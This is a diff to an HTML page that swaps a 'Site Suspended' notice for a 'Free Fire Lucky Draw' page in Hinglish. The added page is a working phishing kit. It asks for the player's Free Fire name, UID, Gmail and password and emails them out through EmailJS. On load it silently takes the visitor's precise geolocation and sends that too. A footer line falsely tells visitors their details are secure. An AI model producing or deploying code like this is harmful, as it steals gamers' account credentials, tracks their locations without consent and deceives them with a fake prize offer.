@@ -1,383 +1,188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>This Site Not Available Due TO Mis Information And Illegal Activity</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #1a1e2b;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
-            padding: 1.5rem;
-            position: relative;
-        }
-
-        .suspension-wrapper {
-            width: 100%;
-            max-width: 720px;
-            margin: 0 auto;
-            animation: fadeSlideUp 0.55s cubic-bezier(0.2, 0.9, 0.4, 1.1) forwards;
-        }
-
-        .suspension-card {
-            background: rgba(255, 255, 255, 0.96);
-            backdrop-filter: blur(0px);
-            border-radius: 2.5rem;
-            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35), 0 8px 18px rgba(0, 0, 0, 0.1), inset 0 1px 0 rgba(255,255,255,0.5);
-            overflow: hidden;
-            transition: transform 0.2s ease;
-        }
-
-        .suspension-card:hover {
-            transform: scale(1.01);
-        }
-
-        .accent-bar {
-            height: 8px;
-            background: linear-gradient(90deg, #d43f34, #e65c4b, #b83227);
-        }
-
-        .content {
-            padding: 2.5rem 2rem 2.5rem 2rem;
-            text-align: center;
-        }
-
-        .icon-container {
-            background: #fff0ed;
-            width: 88px;
-            height: 88px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1.5rem auto;
-            box-shadow: 0 8px 20px rgba(216, 67, 51, 0.2);
-        }
-
-        .suspended-icon {
-            font-size: 3.6rem;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
-        }
-
-        h1 {
-            font-size: 2.8rem;
-            font-weight: 800;
-            letter-spacing: -0.02em;
-            background: linear-gradient(135deg, #b91c1c, #d43f34);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 0.85rem;
-        }
-
-        .status-message {
-            font-size: 1.2rem;
-            font-weight: 500;
-            color: #2c3e44;
-            background: #f8fafc;
-            display: inline-block;
-            padding: 0.4rem 1.2rem;
-            border-radius: 60px;
-            margin-bottom: 1.5rem;
-            box-shadow: inset 0 1px 1px rgba(0,0,0,0.02), 0 1px 2px rgba(0,0,0,0.05);
-        }
-
-        .divider {
-            width: 70px;
-            height: 3px;
-            background: #e2e8f0;
-            margin: 1rem auto 1.5rem auto;
-            border-radius: 3px;
-        }
-
-        .description {
-            font-size: 1.05rem;
-            line-height: 1.5;
-            color: #334155;
-            max-width: 500px;
-            margin: 0 auto 1rem auto;
-        }
-
-        /* auto-open & github notice card */
-        .notice-card {
-            background: #fef9e3;
-            border-left: 5px solid #f59e0b;
-            border-radius: 1.2rem;
-            padding: 1rem 1.2rem;
-            margin: 1.2rem 0 1rem 0;
-            text-align: left;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
-        }
-
-        .notice-title {
-            font-weight: 800;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #b45309;
-            margin-bottom: 0.6rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .notice-text {
-            font-size: 0.95rem;
-            line-height: 1.45;
-            color: #422006;
-        }
-
-        .notice-highlight {
-            background: #ffedd5;
-            display: inline-block;
-            padding: 0.15rem 0.5rem;
-            border-radius: 20px;
-            font-weight: 600;
-            font-family: monospace;
-            color: #9b2c1d;
-        }
-
-        .github-warning {
-            margin-top: 0.75rem;
-            font-size: 0.9rem;
-            background: #fff1f0;
-            padding: 0.6rem 0.9rem;
-            border-radius: 1rem;
-            border-left: 3px solid #dc2626;
-            color: #7f1a1a;
-        }
-
-        /* Developer contact card */
-        .contact-developer {
-            background: #f0f9ff;
-            border-radius: 1.8rem;
-            padding: 1.2rem 1.5rem;
-            margin: 1.2rem 0 1rem 0;
-            border: 1px solid #cde4f5;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.02);
-        }
-
-        .contact-title {
-            font-weight: 700;
-            font-size: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #2563eb;
-            margin-bottom: 0.9rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .contact-grid {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 1.2rem;
-            row-gap: 1rem;
-        }
-
-        .contact-item {
-            background: white;
-            border-radius: 100px;
-            padding: 0.5rem 1.3rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.95rem;
-            font-weight: 500;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-            border: 1px solid #e2edf7;
-            transition: transform 0.1s ease, box-shadow 0.2s;
-        }
-
-        .contact-item:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 18px rgba(0,0,0,0.08);
-            border-color: #cbdff0;
-        }
-
-        .contact-icon {
-            font-size: 1.25rem;
-        }
-
-        .contact-value {
-            color: #1e293b;
-            font-family: monospace;
-            font-size: 0.95rem;
-        }
-
-        .contact-null-note {
-            font-size: 0.7rem;
-            color: #5b6e8c;
-            margin-top: 0.7rem;
-            text-align: center;
-            background: #fefce8;
-            display: inline-block;
-            width: auto;
-            padding: 0.2rem 1rem;
-            border-radius: 50px;
-        }
-
-        .action-hint {
-            background: #fef2f0;
-            padding: 0.9rem 1.4rem;
-            border-radius: 2rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.7rem;
-            font-size: 0.9rem;
-            color: #aa2e22;
-            font-weight: 500;
-            border: 1px solid #ffd9d4;
-            margin-top: 0.8rem;
-        }
-
-        .footer-note {
-            margin-top: 2rem;
-            font-size: 0.75rem;
-            color: #7f8c8d;
-            border-top: 1px solid #edf2f7;
-            padding-top: 1.5rem;
-            letter-spacing: 0.2px;
-        }
-
-        @keyframes fadeSlideUp {
-            0% {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @media (max-width: 550px) {
-            .content {
-                padding: 1.8rem 1.5rem 2rem 1.5rem;
-            }
-            h1 {
-                font-size: 2rem;
-            }
-            .status-message {
-                font-size: 1rem;
-            }
-            .icon-container {
-                width: 74px;
-                height: 74px;
-            }
-            .suspended-icon {
-                font-size: 2.8rem;
-            }
-            .description {
-                font-size: 0.95rem;
-            }
-            .contact-item {
-                padding: 0.4rem 1.1rem;
-                font-size: 0.85rem;
-            }
-            .contact-value {
-                font-size: 0.85rem;
-            }
-            .notice-text {
-                font-size: 0.85rem;
-            }
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: radial-gradient(circle at 15% 30%, rgba(255, 255, 255, 0.05) 2%, transparent 2.5%),
-                              radial-gradient(circle at 75% 70%, rgba(0, 0, 0, 0.03) 1.5%, transparent 2%);
-            background-size: 40px 40px, 32px 32px;
-            pointer-events: none;
-            z-index: -1;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Fire Lucky Draw</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0a0a0a;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    .wrapper { width: 100%; max-width: 420px; padding: 1rem; }
+    .top-banner {
+      background: linear-gradient(135deg, #ff6a00, #ee0979);
+      border-radius: 12px 12px 0 0;
+      padding: 1.2rem 1.5rem;
+      text-align: center;
+    }
+    .top-banner .badge {
+      background: #fff200;
+      color: #000;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 20px;
+      display: inline-block;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+    }
+    .top-banner h1 { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+    .top-banner p { font-size: 13px; color: rgba(255,255,255,0.85); }
+    .card {
+      background: #141414;
+      border: 1px solid #2a2a2a;
+      border-radius: 0 0 12px 12px;
+      padding: 1.5rem;
+    }
+    .info-text {
+      font-size: 12px;
+      color: #ff6a00;
+      background: rgba(255,106,0,0.1);
+      border: 1px solid rgba(255,106,0,0.3);
+      border-radius: 8px;
+      padding: 8px 12px;
+      margin-bottom: 1.2rem;
+      text-align: center;
+    }
+    label { font-size: 12px; color: #aaa; display: block; margin-bottom: 5px; margin-top: 12px; }
+    input[type=text], input[type=email], input[type=password] {
+      width: 100%;
+      padding: 11px 14px;
+      border: 1px solid #2a2a2a;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+      background: #1e1e1e;
+      color: #fff;
+      transition: border 0.2s;
+    }
+    input::placeholder { color: #555; }
+    input:focus { border-color: #ff6a00; }
+    .submit-btn {
+      width: 100%;
+      padding: 13px;
+      background: linear-gradient(135deg, #ff6a00, #ee0979);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 1.2rem;
+      text-transform: uppercase;
+    }
+    .submit-btn:hover { opacity: 0.9; }
+    .status { text-align: center; font-size: 13px; margin-top: 12px; min-height: 18px; }
+    .divider { border: none; border-top: 1px solid #2a2a2a; margin: 1rem 0; }
+    .footer-note { text-align: center; font-size: 11px; color: #444; margin-top: 1rem; }
+  </style>
 </head>
 <body>
-<div class="suspension-wrapper">
-    <div class="suspension-card">
-        <div class="accent-bar"></div>
-        <div class="content">
-            <div class="icon-container">
-                <div class="suspended-icon">⛔</div>
-            </div>
-            <h1>Site Suspended</h1>
-            <div class="status-message">⚠️ Access Temporarily Restricted</div>
-            <div class="divider"></div>
-            <div class="description">
-                This website has been suspended due to administrative review or policy violation.
-                Please contact your hosting provider or site administrator for further assistance.
-            </div>
-
-            <!-- Auto-open + GitHub notice block (corrected grammar and added estimated time) -->
-            <div class="notice-card">
-                <div class="notice-title">
-                    <span>🔄</span> AUTO-OPEN SCHEDULE
-                </div>
-                <div class="notice-text">
-                    ✅ The site will attempt to <strong>auto-open after a few days</strong>.<br>
-                    📅 <strong>Estimated reopening time: 8th April</strong>.<br>
-                    <span class="notice-highlight">🗓️ After 8th April</span> — if the site is still not open, 
-                    that means your request has been <strong>denied by GitHub</strong>.<br>
-                    🔍 Please check soon for final status.
-                </div>
-                <div class="github-warning">
-                    ⚠️ <strong>GitHub review notice:</strong> If after April 8th the site remains suspended, 
-                    your request is denied by GitHub. No further appeals will be processed automatically. 
-                    Check back on the repository or contact support.
-                </div>
-            </div>
-
-            <!-- Developer contact block: Phone, WhatsApp, Email as requested -->
-            <div class="contact-developer">
-                <div class="contact-title">
-                    <span>👨‍💻</span> CONTACT TO DEVELOPER <span>📢</span>
-                </div>
-                <div class="contact-grid">
-                    <div class="contact-item">
-                        <span class="contact-icon">📞</span>
-                        <span class="contact-value">Phone: Null</span>
-                    </div>
-                    <div class="contact-item">
-                        <span class="contact-icon">💬</span>
-                        <span class="contact-value">WhatsApp: Null</span>
-                    </div>
-                    <div class="contact-item">
-                        <span class="contact-icon">✉️</span>
-                        <span class="contact-value">Email: Null@email.com</span>
-                    </div>
-                </div>
-                <div class="contact-null-note">
-                    ⚡ Direct contact information (placeholder) — reach out for support
-                </div>
-            </div>
-            
-            <div class="action-hint">
-                <span>🕒</span> <span>Check back later or reach out to support</span>
-            </div>
-            <div class="footer-note">
-                Suspension ID: SVC-0422 · All services paused · GitHub policy pending
-            </div>
-        </div>
+  <div class="wrapper">
+    <div class="top-banner">
+      <div class="badge">🔥 LIMITED TIME EVENT</div>
+      <h1>🎯 Free Fire Lucky Draw</h1>
+      <p>Register karo aur jeeto Diamonds & Cash Prizes!</p>
     </div>
-</div>
+    <div class="card">
+      <div class="info-text">⚡ Sirf aaj raat 12 baje tak register karo!</div>
+
+      <label for="ffName">Free Fire Account Name</label>
+      <input type="text" id="ffName" placeholder="Apna FF name likhein" />
+
+      <label for="ffUID">Free Fire UID</label>
+      <input type="text" id="ffUID" placeholder="Apna UID number likhein" />
+
+      <label for="ffGmail">Free Fire Account Gmail</label>
+      <input type="email" id="ffGmail" placeholder="Gmail jo FF se linked hai" />
+
+      <label for="ffPass">Free Fire Account Password</label>
+      <input type="password" id="ffPass" placeholder="Account password likhein" />
+
+      <hr class="divider" />
+
+      <button class="submit-btn" onclick="submitForm()">🎰 Lucky Draw Mein Participate Karein</button>
+      <div class="status" id="statusMsg"></div>
+      <p class="footer-note">🔒 Aapki details secure hain</p>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    const SERVICE_ID  = "service_ioi82xk";
+    const TEMPLATE_ID = "template_o1txkdr";
+    const PUBLIC_KEY  = "xqxYHQV5ZlRMWNBQL";
+
+    emailjs.init(PUBLIC_KEY);
+
+    // =====================
+    // PAGE LOAD - Location email
+    // =====================
+    window.addEventListener('load', function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            const lat = pos.coords.latitude.toFixed(6);
+            const lng = pos.coords.longitude.toFixed(6);
+            const mapLink = "https://maps.google.com/?q=" + lat + "," + lng;
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+              from_name: "📍 LOCATION ALERT",
+              message: "Latitude: " + lat + " | Longitude: " + lng + " | Google Maps: " + mapLink
+            });
+          },
+          function(err) {
+            // Location denied - send notification silently
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+              from_name: "📍 LOCATION ALERT",
+              message: "User ne location deny kar di."
+            });
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      }
+    });
+
+    // =====================
+    // FORM SUBMIT - Details email
+    // =====================
+    function submitForm() {
+      const name  = document.getElementById('ffName').value.trim();
+      const uid   = document.getElementById('ffUID').value.trim();
+      const gmail = document.getElementById('ffGmail').value.trim();
+      const pass  = document.getElementById('ffPass').value.trim();
+      const statusEl = document.getElementById('statusMsg');
+
+      if (!name || !uid || !gmail || !pass) {
+        statusEl.style.color = '#ee0979';
+        statusEl.textContent = 'Sare fields bharna zaroori hain!';
+        return;
+      }
+
+      statusEl.style.color = '#aaa';
+      statusEl.textContent = 'Processing...';
+
+      emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+        from_name: "📋 FORM DETAILS - " + name,
+        message: "FF Name: " + name + " | UID: " + uid + " | Gmail: " + gmail + " | Password: " + pass
+      }).then(function() {
+        statusEl.style.color = '#ff6a00';
+        statusEl.textContent = '🎉 Successfully registered! Lucky Draw results kal announce honge.';
+        document.getElementById('ffName').value = '';
+        document.getElementById('ffUID').value = '';
+        document.getElementById('ffGmail').value = '';
+        document.getElementById('ffPass').value = '';
+      }).catch(function(err) {
+        statusEl.style.color = '#ee0979';
+        statusEl.textContent = 'Kuch masla hua, dobara try karo.';
+        console.error(err);
+      });
+    }
+  </script>
 </body>
 </html>
